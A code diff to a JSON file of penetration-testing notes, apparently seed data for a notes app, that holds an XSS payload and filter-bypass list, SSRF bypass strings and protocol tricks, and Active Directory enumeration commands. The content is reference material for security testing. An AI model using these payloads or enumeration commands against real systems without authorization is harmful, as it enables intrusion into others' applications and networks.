@@ -1,5 +1,6 @@
 [
   {
+    "id": "note-1",
     "title": "XSS Payload Collection",
     "category": "Web/XSS",
     "content": "# XSS Payload Collection\n\n## Basic Payloads\n\n```html\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onload=alert(1)>\n```\n\n## Filter Bypass\n\n### Case Variation\n```html\n<ScRiPt>alert(1)</sCrIpT>\n<IMG SRC=x OnErRoR=alert(1)>\n```\n\n### Encoding\n```html\n<script>alert(String.fromCharCode(88,83,83))</script>\n<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;(1)\">\n```\n\n### Event Handlers (less common)\n```html\n<details open ontoggle=alert(1)>\n<marquee onstart=alert(1)>\n<video><source onerror=alert(1)>\n<audio src=x onerror=alert(1)>\n```\n\n## DOM-based XSS\n```javascript\n// Check for: location.hash, document.referrer, postMessage\n// Sinks: innerHTML, document.write, eval\n```",
@@ -8,10 +9,10 @@
       "payloads",
       "bypass"
     ],
-    "id": "348a529f-9b27-4270-94d0-a9dbf72adf8b",
-    "updatedAt": "2026-02-14T14:33:40.012Z"
+    "updatedAt": "2024-01-15T10:00:00.000Z"
   },
   {
+    "id": "note-2",
     "title": "SSRF Bypass Techniques",
     "category": "Web/SSRF",
     "content": "# SSRF Bypass Techniques\n\n## IP Address Variations\n\n```\n127.0.0.1\n127.0.1\n127.1\n0.0.0.0\n0\nlocalhost\nLOCALHOST\n[::1]\n[0000::1]\n[::ffff:127.0.0.1]\n```\n\n## Decimal/Hex/Octal\n\n```\n2130706433  (decimal for 127.0.0.1)\n0x7f000001  (hex)\n017700000001 (octal)\n```\n\n## DNS Rebinding\nUse a service like:\n- rbndr.us\n- nip.io\n- xip.io\n- sslip.io\n\n## Protocol Smuggling\n\n```\ngopher://\ndict://\nfile://\nsftp://\ntftp://\n```\n\n## Bypassing Filters\n\n```\nhttp://127.0.0.1:80+&@google.com/\nhttp://google.com#@127.0.0.1/\nhttp://127.0.0.1\\@google.com/\n```",
@@ -20,10 +21,10 @@
       "bypass",
       "cloud"
     ],
-    "id": "fb18cb05-4cfc-440a-b2cb-71fab830a788",
-    "updatedAt": "2026-02-14T14:33:40.012Z"
+    "updatedAt": "2024-01-15T10:00:00.000Z"
   },
   {
+    "id": "note-3",
     "title": "Active Directory Enumeration",
     "category": "Active Directory/Enumeration",
     "content": "# Active Directory Enumeration\n\n## Initial Recon (No Creds)\n\n```bash\n# Enumerate DC\nnmap -p 389,636,3268,3269 -sV <target>\n\n# Null session\nrpcclient -U \"\" -N <dc-ip>\nenum4linux -a <dc-ip>\n\n# LDAP anonymous\nldapsearch -x -H ldap://<dc-ip> -b \"dc=domain,dc=com\"\n```\n\n## With Credentials\n\n```bash\n# BloodHound collection\nbloodhound-python -u <user> -p <pass> -d <domain> -c all\n\n# PowerView\nGet-DomainUser -Identity *admin*\nGet-DomainGroup -AdminCount\nFind-LocalAdminAccess\n```\n\n## High Value Targets\n\n1. Domain Admins\n2. Enterprise Admins\n3. Service accounts (Kerberoastable)\n4. Computers with unconstrained delegation\n5. Users with DCSync rights",
@@ -32,23 +33,6 @@
       "enumeration",
       "bloodhound"
     ],
-    "id": "b4b975ce-4e3a-4281-beab-085b6cce455a",
-    "updatedAt": "2026-02-14T14:33:40.012Z"
-  },
-  {
-    "title": "Untitled Note 3",
-    "category": "Methodology/General",
-    "content": "# New Note\n\nStart writing your notes here...\n\n## Example Section\n\n```bash\necho \"Hello World\"\n```",
-    "tags": [],
-    "id": "43a5f032-1c80-406b-987f-aaee625b4cf3",
-    "updatedAt": "2026-02-14T14:56:34.446Z"
-  },
-  {
-    "title": "Untitled Note 321",
-    "category": "Methodology/General",
-    "content": "# New Note\n\nStart writing your notes here...\n\n## Example Section\n\n```bash\necho \"Hello World\"\n```",
-    "tags": [],
-    "id": "ac3954a7-4103-459f-b7cf-8ea6b45b4595",
-    "updatedAt": "2026-02-15T08:25:07.157Z"
+    "updatedAt": "2024-01-15T10:00:00.000Z"
   }
 ]
